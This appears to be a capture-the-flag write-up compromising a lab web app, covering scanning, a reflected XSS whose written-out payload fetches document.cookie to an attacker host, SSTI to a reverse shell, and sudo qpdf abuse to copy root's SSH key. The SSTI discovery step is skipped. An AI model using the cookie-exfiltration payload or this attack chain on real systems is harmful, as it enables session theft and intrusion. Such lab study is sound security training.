## Reconnaissance

The engagement began with a full TCP port scan to identify exposed services on the target host.

```bash
nmap 10.10.11.12 -sS -T4 -A -p- -oN scan.txt
```

The scan revealed two services: SSH on port 22 and HTTP on port 80. The HTTP response headers and behavior exposed a domain name associated with the application, which was added to the local `/etc/hosts` file for proper name resolution.

*Port scan showing SSH and HTTP open*

## Enumeration / Analysis

With the web application identified as the main attack surface, ffuf was used to enumerate endpoints and directories that might expose additional functionality.

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://capiclean.htb/FUZZ -fc 404
```

![Endpoints enumerated with ffuf](/assets/images/iclean/84-2.png)
*Endpoints enumerated with ffuf*

One of the discovered endpoints, `/quote`, appeared to reflect user input. That behavior suggested a potential cross-site scripting vulnerability, so the request and response were intercepted in Burp Suite for closer inspection.

![The /quote endpoint reflecting user input](/assets/images/iclean/84-3.png)
*The /quote endpoint reflecting user input*

Analyzing the intercepted traffic confirmed that the `service` parameter was vulnerable to reflected XSS.

![By analyzing the intercepted traffic, confirming that the parameter was vulnerable to reflected XSS](/assets/images/iclean/84-4.png)
*By analyzing the intercepted traffic, confirming that the parameter was vulnerable to reflected XSS*

To exploit this, the following payload was injected into the vulnerable parameter to exfiltrate the victim’s session cookie:

```bash
<img src=x onerror=fetch("http://<IP>:<PORT>/"+document.cookie);>
```

To ensure correct processing by the application, the payload was encoded in Base64. Submitting the request produced a callback containing the session cookie:

```http
GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZkpGCg.Uxy5EDul_e-QG6dvNx-kwNyhzBo HTTP/1.1
```

This cookie appeared to belong to a privileged user and could potentially be used to bypass authentication.

![Session cookie belonging to a privileged user](/assets/images/iclean/84-5.png)
*Session cookie belonging to a privileged user*

Since there was no direct way to supply the cookie through the application interface, it was set manually using a browser cookie-editor extension.

![Setting the captured cookie with a browser extension](/assets/images/iclean/84-6.png)
*Setting the captured cookie with a browser extension*

## Exploitation

With SSTI confirmed, a known Jinja2 exploitation technique was used to achieve remote code execution. The payload was adapted from the following reference:

[https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/?source=post_page-----cfc46f351353--------------------------------)

The reverse-shell portion of the payload was URL-encoded to ensure proper delivery. Submitting it returned a reverse shell as the `www-data` user.

Post-exploitation enumeration revealed that the `app.py` file leaked database credentials in clear text.

![During post-exploitation enumeration, discovering that the file leaked database credentials in clear text](/assets/images/iclean/84-15.png)
*During post-exploitation enumeration, discovering that the file leaked database credentials in clear text*

These credentials allowed a connection to the MySQL database, where the stored user hashes were enumerated.

```bash
mysql -u <user> -p <password>
```

Among the retrieved hashes were entries for `consuela` and `Administrator`. Since `consuela` was the only non-system user with a home directory, that account became the focus. The hash was cracked with CrackStation, which allowed a successful SSH login.

## Privilege Escalation

After logging in as `consuela`, sudo permissions were checked for privilege-escalation vectors.

```bash
sudo -l
```

The output showed that it is possible to execute `/usr/bin/qpdf` as root without providing a password.

![The output showed that it is possible to execute as root without providing a password](/assets/images/iclean/84-17.png)
*The output showed that it is possible to execute as root without providing a password*

By abusing this permission, it is possible to copy the root user’s private SSH key into a writable directory such as `/tmp`.

![Copying the root SSH key into a writable directory](/assets/images/iclean/84-18.png)
*Copying the root SSH key into a writable directory*

The extracted key was then used to authenticate as root over SSH. Where access to the key was restricted, adjusting its file permissions was enough to complete the process.

![Using the extracted key, authenticating as the root user via SSH](/assets/images/iclean/84-19.png)
*Using the extracted key, authenticating as the root user via SSH*
